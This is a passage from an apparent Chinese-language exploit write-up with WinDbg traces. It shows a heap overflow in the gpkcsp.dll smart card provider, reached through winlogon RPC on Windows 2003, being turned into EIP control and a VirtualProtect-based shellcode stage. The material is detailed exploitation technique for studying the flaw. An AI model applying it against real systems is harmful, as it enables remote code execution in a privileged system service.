    0:003> !heap -p -a 0x2cdcb58
    address 02cdcb58 found in
    _DPH_HEAP_ROOT @ 3a1000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize –         VirtAddr         VirtSize)
    3a3c80:          2cdcb58             24a8 –          2cdc000             4000
    7c96d97a ntdll!RtlAllocateHeap+0x00000e9f
    77b8d08c msvcrt!malloc+0x0000006c
    08012599 gpkcsp!GMEM_Alloc+0x0000000e
    0800a937 gpkcsp!DllMain+0x00000090
    080120fc gpkcsp!_DllMainCRTStartup+0x00000052
    7c94a352 ntdll!LdrpCallInitRoutine+0x00000014
    7c963465 ntdll!LdrpRunInitializeRoutines+0x00000367
    7c964311 ntdll!LdrpLoadDll+0x000003cd
    7c964065 ntdll!LdrLoadDll+0x00000198
    7c801bf3 kernel32!LoadLibraryExW+0x000001b2
    7c801dbd kernel32!LoadLibraryExA+0x0000001f
    7c801df3 kernel32!LoadLibraryA+0x000000b5
    77f42fef ADVAPI32!CryptAcquireContextA+0x0000045c
    77f50a5f ADVAPI32!CryptAcquireContextW+0x000000a4
    0103fd78 winlogon!CSCLogonInit::CryptCtx+0x00000075
    0104086c winlogon!CSCLogonInit::RelinquishCryptCtx+0x00000010
    010408c1 winlogon!ScHelperGetCertFromLogonInfo+0x00000022
    0103a8f5 winlogon!s_RPC_ScHelperGetCertFromLogonInfo+0x0000003f
    77c50193 RPCRT4!Invoke+0x00000030
    77cb33e1 RPCRT4!NdrStubCall2+0x00000299
    77cb35c4 RPCRT4!NdrServerCall2+0x00000019
    77c4ff7a RPCRT4!DispatchToStubInCNoAvrf+0x00000038
    77c7e732 RPCRT4!DispatchToStubInCAvrf+0x00000014
    77c5042d RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x0000011f
    77c50353 RPCRT4!RPC_INTERFACE::DispatchToStub+0x000000a3
    77c511dc RPCRT4!LRPC_SCALL::DealWithRequestMessage+0x0000042c
    77c512f0 RPCRT4!LRPC_ADDRESS::DealWithLRPCRequest+0x00000127
    77c58678 RPCRT4!LRPC_ADDRESS::ReceiveLotsaCalls+0x00000430
    77c58792 RPCRT4!RecvLotsaCallsWrapper+0x0000000d
    77c5872d RPCRT4!BaseCachedThreadRoutine+0x0000009d
    77c4b110 RPCRT4!ThreadStartRoutine+0x0000001b
    7c824829 kernel32!BaseThreadStart+0x00000034
调用DoSCardTransmit处理缓冲区溢出数据包并将数据包保存在0x080190d8后，MyCPAcquireContext初始化KeyData(0x80)并且从0x080190d8拷贝客户端发送的数据(大小为0x2b-7)到这块内存中
通过调试可以看到key_object的溢出情况
    0:003> dc 02cdcb58+a0+b8-20
    02cdcc90  b7314210 544f2b0f 34059cf0 ead224e5  .B1..+OT…4.$..
    02cdcca0  22ef2496 b2dcb268 9c36556f 159e7181  .$.”h…oU6..q..
    02cdccb0  080190dc 00009000 70e2a252 b67b7cc7  ……..R..p.|{.
    02cdccc0  62937b2c afe0bbbd 93606931 dcdba152  ,{.b….1i`.R…
    02cdccd0  00cd84d1 00000000 00000000 00000000  …………….
    02cdcce0  00000000 00000000 00000000 00000000  …………….
    02cdccf0  00000000 00000000 00000000 00000000  …………….
    02cdcd00  00000000 00000000 00000000 00000000  …………….
在溢出keyobject后，我们可以观察gpkcsp!MyCPAcquireContext如何处理接下来的数据包和EIP是如何被控制的。
我们注意到一个没有符号信息的函数sub_8009094调用DoSCardTransmit并拷贝expbuffer到0x080x90d8中，在Windows2003中这个地址没有ASLR保护并且存放用户发送的数据包中的原始数据。
    0:003> dc 080190d8 L1c0/4
    080190d8  d26ccf61 08011e7a 0801118e 08005e85  a.l.z……..^..
    080190e8  0800bedd 11111111 9d273fbe e636c0ea  ………?’…6.
    080190f8  00000000 b02838fd 08011fef 08019078  …..8(…..x…
    08019108  3005123c 22222222 00000000 f7a1d915  release
接下来的调试信息展示了如何控制EIP和执行shellcode。这个exploit利用了SharedUserData技术去调用KiFastSystemCall来执行函数VirtualProtect，将内存0x80190d8的属性设置成可写和执行，然后在地址0x8019148执行shellcode。这时exploit就完成了第一阶段的工作。
    0:011> g 08007c2b
    eax=080190dc ebx=77f3f5b0 ecx=02cdaff8 edx=00000000 esi=000000b8 edi=00000000
    eip=08007c2b esp=02dfe40c ebp=02dfe420 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!ReleaseProvider+0xef:
    08007c2b ffd3            call    ebx {ADVAPI32!CryptDestroyKey (77f3f5b0)}
    0:011>
    eax=00000001 ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078
    eip=77f3f615 esp=02dfe3c0 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ADVAPI32!CryptDestroyKey+0x6e:
    77f3f615 ff5608          call    dword ptr [esi+8]    ds:0023:080190e4=08005e85
    0:011> t
    eax=00000001 ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078
    eip=08005e85 esp=02dfe3bc ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!GetAppWindow+0x1c:
    08005e85 8bc6            mov     eax,esi
    0:011>
    eax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078
    eip=08005e87 esp=02dfe3bc ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!GetAppWindow+0x1e:
    08005e87 5e              pop     esi
    0:011>
    eax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=08005e88 esp=02dfe3c0 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!GetAppWindow+0x1f:
    08005e88 c3              ret
    0:011> t